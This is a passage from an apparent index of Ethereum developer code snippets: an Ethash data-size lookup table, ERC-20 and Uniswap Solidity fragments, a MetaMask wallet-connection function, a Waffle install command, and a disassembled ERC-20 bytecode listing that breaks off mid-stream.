0x00 0x00 0x04 CALLDATASIZE 0x0153 0xDA\n19F | REVERT |\n```\n\n----------------------------------------\n\nTITLE: Retrieving Ethereum Data and Cache Sizes by Block Number\nDESCRIPTION: Functions to retrieve appropriate data size and cache size values for a given Ethereum block number. The code accesses predefined lookup tables indexed by the block's epoch, which is calculated by dividing the block number by the EPOCH_LENGTH constant.\n\nLANGUAGE: python\nCODE:\n```\ndef get_datasize(block_number):\n    return data_sizes[block_number // EPOCH_LENGTH]\n\ndef get_cachesize(block_number):\n    return cache_sizes[block_number // EPOCH_LENGTH]\n\ndata_sizes = [\n1073739904, 1082130304, 1090514816, 1098906752, 1107293056,\n1115684224, 1124070016, 1132461952, 1140849536, 1149232768,\n1157627776, 1166013824, 1174404736, 1182786944, 1191180416,\n1199568512, 1207958912, 1216345216, 1224732032, 1233124736,\n1241513344, 1249902464, 1258290304, 1266673792, 1275067264,\n1283453312, 1291844992, 1300234112, 1308619904, 1317010048,\n1325397376, 1333787776, 1342176128, 1350561664, 1358954368,\n1367339392, 1375731584, 1384118144, 1392507008, 1400897408,\n1409284736, 1417673344, 1426062464, 1434451072, 1442839168,\n1451229056, 1459615616, 1468006016, 1476394112, 1484782976,\n1493171584, 1501559168, 1509948032, 1518337664, 1526726528,\n1535114624, 1543503488, 1551892096, 1560278656, 1568669056,\n1577056384, 1585446272, 1593831296, 1602219392, 1610610304,\n1619000192, 1627386752, 1635773824, 1644164224, 1652555648,\n1660943488, 1669332608, 1677721216, 1686109312, 1694497664,\n1702886272, 1711274624, 1719661184, 1728047744, 1736434816,\n1744829056, 1753218944, 1761606272, 1769995904, 1778382464,\n1786772864, 1795157888, 1803550592, 1811937664, 1820327552,\n1828711552, 1837102976, 1845488768, 1853879936, 1862269312,\n1870656896, 1879048064, 1887431552, 1895825024, 1904212096,\n1912601216, 1920988544, 1929379456, 1937765504, 1946156672,\n1954543232, 1962932096, 1971321728, 1979707264, 1988093056,\n1996487552, 2004874624, 2013262208, 2021653888, 2030039936,\n2038430848, 2046819968, 2055208576, 2063596672, 2071981952,\n2080373632, 2088762752, 2097149056, 2105539712, 2113928576,\n2122315136, 2130700672, 2139092608, 2147483264, 2155872128,\n2164257664, 2172642176, 2181035392, 2189426048, 2197814912,\n2206203008, 2214587264, 2222979712, 2231367808, 2239758208,\n2248145024, 2256527744, 2264922752, 2273312128, 2281701248,\n2290086272, 2298476672, 2306867072, 2315251072, 2323639168,\n2332032128, 2340420224, 2348808064, 2357196416, 2365580416,\n2373966976, 2382363008, 2390748544, 2399139968, 2407530368,\n2415918976, 2424307328, 2432695424, 2441084288, 2449472384,\n2457861248, 2466247808, 2474637184, 2483026816, 2491414144,\n2499803776, 2508191872, 2516582272, 2524970368, 2533359232,\n2541743488, 2550134144, 2558525056, 2566913408, 2575301504,\n2583686528, 2592073856, 2600467328, 2608856192, 2617240448,\n2625631616, 2634022016, 2642407552, 2650796416, 2659188352,\n2667574912, 2675965312, 2684352896, 2692738688, 2701130624,\n2709518464, 2717907328, 2726293376, 2734685056, 2743073152,\n2751462016, 2759851648, 2768232832, 2776625536, 2785017728,\n2793401984, 2801794432, 2810182016, 2818571648, 2826959488,\n2835349376, 2843734144, 2852121472, 2860514432, 2868900992,\n2877286784, 2885676928, 2894069632, 2902451584, 2910843008,\n2919234688, 2927622784, 2936011648, 2944400768, 2952789376,\n2961177728, 2969565568, 2977951616, 2986338944, 2994731392,\n3003120256, 3011508352, 3019895936, 3028287104, 3036675968,\n3045063808, 3053452928, 3061837696, 3070228352, 3078615424,\n3087003776, 3095394944, 3103782272, 3112173184, 3120562048,\n3128944768, 3137339264, 3145725056, 3154109312, 3162505088,\n3170893184, 3179280256, 3187669376, 3196056704, 3204445568,\n3212836736, 3221224064, 3229612928, 3238002304, 3246391168,\n3254778496, 3263165824, 3271556224, 3279944576, 3288332416,\n3296719232, 3305110912, 3313500032, 3321887104, 3330273152,\n3338658944, 3347053184, 3355440512, 3363827072, 3372220288,\n3380608384, 3388997504, 3397384576, 3405774208, 3414163072,\n3422551936, 3430937984, 3439328384, 3447714176, 3456104576,\n3464493952, 3472883584, 3481268864, 3489655168, 3498048896,\n3506434432, 3514826368, 3523213952, 3531603584, 3539987072,\n3548380288, 3556763264, 3565157248, 3573545344, 3581934464,\n3590324096, 3598712704, 3607098752, 3615488384, 3623877248,\n3632265856, 3640646528, 3649043584, 3657430144, 3665821568,\n3674207872, 3682597504, 3690984832, 3699367808, 3707764352,\n3716152448, 3724541056, 3732925568, 3741318016, 3749706368,\n3758091136, 3766481536, 3774872704, 3783260032, 3791650432,\n3800036224, 3808427648, 3816815488, 3825204608, 3833592704,\n3841981568, 3850370432, 3858755968, 3867147904, 3875536256,\n3883920512, 3892313728, 3900702592, 3909087872, 3917478784,\n3925868416, 3934256512, 3942645376, 3951032192, 3959422336,\n3967809152, 3976200064, 3984588416, 3992974976, 4001363584,\n4009751168, 4018141312, 4026530432, 4034911616, 4043308928,\n4051695488, 4060084352, 4068472448, 4076862848, 4085249408,\n4093640576, 4102028416, 4110413696, 4118805632, 4127194496,\n4135583104, 4143971968, 4152360832, 4160746112, 4169135744,\n4177525888, 4185912704, 4194303616, 4202691968, 4211076736,\n4219463552, 4227855488, 4236246656, 4244633728, 4253022848,\n4261412224, 4269799808, 4278184832, 4286578048, 4294962304,\n4303349632, 4311743104, 4320130432, 4328521088, 4336909184,\n4345295488, 4353687424, 4362073472, 4370458496, 4378852736,\n4387238528, 4395630208, 4404019072, 4412407424, 4420790656,\n4429182848, 4437571456, 4445962112, 4454344064, 4462738048,\n4471119232, 4479516544, 4487904128, 4496289664, 4504682368,\n4513068416, 4521459584, 4529846144, 4538232704, 4546619776,\n4555010176, 4563402112, 4571790208, 4580174464, 4588567936,\n4596957056, 4605344896, 4613734016, 4622119808, 4630511488,\n4638898816, 4647287936, 4655675264, 4664065664, 4672451968,\n4680842624, 4689231488, 4697620352, 4706007424, 4714397056,\n4722786176, 4731173248, 4739562368, 4747951744, 4756340608,\n4764727936, 4773114496, 4781504384, 4789894784, 4798283648,\n4806667648, 4815059584, 4823449472, 4831835776, 4840226176,\n4848612224, 4857003392, 4865391488, 4873780096, 4882169728,\n4890557312, 4898946944, 4907333248, 4915722368, 4924110976,\n4932499328, 4940889728, 4949276032, 4957666432, 4966054784,\n4974438016, 4982831488, 4991221376, 4999607168, 5007998848,\n5016386432, 5024763776, 5033164672, 5041544576, 5049941888,\n5058329728, 5066717056, 5075107456, 5083494272, 5091883904,\n5100273536, 5108662144, 5117048192, 5125436032, 5133827456,\n5142215296, 5150605184, 5158993024, 5167382144, 5175769472,\n5184157568, 5192543872, 5200936064, 5209324928, 5217711232,\n5226102656, 5234490496, 5242877312, 5251263872, 5259654016,\n5268040832, 5276434304, 5284819328, 5293209728, 5301598592,\n5309986688, 5318374784, 5326764416, 5335151488, 5343542144,\n5351929472, 5360319872, 5368706944, 5377096576, 5385484928,\n5393871232, 5402263424, 5410650496, 5419040384, 5427426944,\n5435816576, 5444205952, 5452594816, 5460981376, 5469367936,\n5477760896, 5486148736, 5494536832, 5502925952, 5511315328,\n5519703424, 5528089984, 5536481152, 5544869504, 5553256064,\n5561645696, 5570032768, 5578423936, 5586811264, 5595193216,\n5603585408, 5611972736, 5620366208, 5628750464, 5637143936,\n5645528192, 5653921408, 5662310272, 5670694784, 5679082624,\n5687474048, 5695864448, 5704251008, 5712641408, 5721030272,\n5729416832, 5737806208, 5746194304, 5754583936, 5762969984,\n5771358592, 5779748224, 5788137856, 5796527488, 5804911232,\n5813300608, 5821692544, 5830082176, 5838468992, 5846855552,\n5855247488, 5863636096, 5872024448, 5880411008, 5888799872,\n5897186432, 5905576832, 5913966976, 5922352768, 5930744704,\n5939132288, 5947522432, 5955911296, 5964299392, 5972688256,\n5981074304, 5989465472, 5997851008, 6006241408, 6014627968,\n6023015552, 6031408256, 6039796096, 6048185216, 6056574848,\n6064963456, 6073351808, 6081736064, 6090128768, 6098517632,\n6106906496, 6115289216, 6123680896, 6132070016, 6140459648,\n6148849024, 6157237376, 6165624704, 6174009728, 6182403712,\n6190792064, 6199176064, 6207569792, 6215952256, 6224345216,\n6232732544, 6241124224, 6249510272, 6257899136, 6266287744,\n6274676864, 6283065728, 6291454336, 6299843456, 6308232064,\n6316620928, 6325006208, 6333395584, 6341784704, 6350174848,\n6358562176, 6366951296, 6375337856, 6383729536, 6392119168,\n6400504192, 6408895616, 6417283456, 6425673344, 6434059136,\n6442444672, 6450837376, 6459223424, 6467613056, 6476004224,\n6484393088, 6492781952, 6501170048, 6509555072, 6517947008,\n6526336384, 6534725504, 6543112832, 6551500672, 6559888768,\n6568278656, 6576662912, 6585055616, 6593443456, 6601834112,\n6610219648, 6618610304, 6626999168, 6635385472, 6643777408,\n6652164224, 6660552832, 6668941952, 6677330048, 6685719424,\n6694107776, 6702493568, 6710882176, 6719274112, 6727662976,\n6736052096, 6744437632, 6752825984, 6761213824, 6769604224,\n6777993856, 6786383488, 6794770816, 6803158144, 6811549312,\n6819937664, 6828326528, 6836706176, 6845101696, 6853491328,\n6861880448, 6870269312, 6878655104, 6887046272, 6895433344,\n6903822208, 6912212864, 6920596864, 6928988288, 6937377152,\n6945764992, 6954149248, 6962544256, 6970928768, 6979317376,\n6987709312, 6996093824, 7004487296, 7012875392, 7021258624,\n7029652352, 7038038912, 7046427776, 7054818944, 7063207808,\n7071595136, 7079980928, 7088372608, 7096759424, 7105149824,\n7113536896, 7121928064, 7130315392, 7138699648, 7147092352,\n7155479168, 7163865728, 7172249984, 7180648064, 7189036672,\n7197424768, 7205810816, 7214196608, 7222589824, 7230975104,\n7239367552, 7247755904, 7256145536, 7264533376, 7272921472,\n7281308032, 7289694848, 7298088832, 7306471808, 7314864512,\n7323253888, 7331643008, 7340029568, 7348419712, 7356808832,\n7365196672, 7373585792, 7381973888, 7390362752, 7398750592,\n7407138944, 7415528576, 7423915648, 7432302208, 7440690304,\n7449080192, 7457472128, 7465860992, 7474249088, 7482635648,\n7491023744, 7499412608, 7507803008, 7516192384, 7524579968,\n7532967296, 7541358464, 7549745792, 7558134656, 7566524032,\n7574912896, 7583300992, 7591690112, 7600075136, 7608466816,\n7616854912, 7625244544, 7633629824, 7642020992, 7650410368,\n7658794112, 7667187328, 7675574912, 7683961984, 7692349568,\n7700739712, 7709130368, 7717519232, 7725905536, 7734295424,\n7742683264, 7751069056, 7759457408, 7767849088, 7776238208,\n7784626816, 7793014912, 7801405312, 7809792128, 7818179968,\n```\n\n----------------------------------------\n\nTITLE: Defining Allowance Mapping for ERC-20\nDESCRIPTION: Creates a nested mapping to track token allowances between addresses. This enables the ERC-20 approval and transferFrom functionality, allowing addresses to spend tokens on behalf of other addresses.\n\nLANGUAGE: solidity\nCODE:\n```\n    mapping (address => mapping (address => uint256)) private _allowances;\n```\n\n----------------------------------------\n\nTITLE: Implementing MetaMask Wallet Connection Function\nDESCRIPTION: The connectWallet function checks for MetaMask availability and handles the connection process, returning the user's address and status message that can be used to update the UI.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const connectWallet = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_requestAccounts\",\n      })\n      const obj = {\n        status: \"👆🏽 Write a message in the text-field above.\",\n        address: addressArray[0],\n      }\n      return obj\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Pair Reserve Information in Uniswap\nDESCRIPTION: Public view function to retrieve the current reserves of both tokens and the timestamp of the last update. Returns all three values in a single call.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n```\n\n----------------------------------------\n\nTITLE: STATICCALL Opcode in EVM\nDESCRIPTION: Makes a read-only call to another contract that cannot modify state. Returns success status and copies return data to specified memory location.\n\nLANGUAGE: evm assembly\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Installing Waffle Dependencies with Yarn\nDESCRIPTION: Bash command to install Ethereum Waffle and TypeScript dependencies for testing smart contracts. This adds all necessary packages to the project's dev dependencies.\n\nLANGUAGE: bash\nCODE:\n```\nyarn add --dev ethereum-waffle ts-node typescript @types/jest\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode Operations for ERC-20 Token Contract\nDESCRIPTION: This snippet shows the low-level EVM bytecode operations that implement an ERC-20 token contract. It includes operations for managing token balances, allowances, transfers, and standard ERC-20 functions like approve(), transfer(), and transferFrom().\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x4CE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x482 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x926 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x57C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x551 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x57C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x747 PUSH2 0x6AB PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x742 DUP6 PUSH1 0x1 PUSH1 0x0 PUSH2 0x6BC PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x831 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x806 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x831 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x814 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8FE PUSH2 0x848 PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x8F9 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1097 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 PUSH2 0x872 PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x91C PUSH2 0x915 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xAC1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFDE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP JUMPDEST PUSH2 0xD2E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1000 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x0 DUP1 DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND 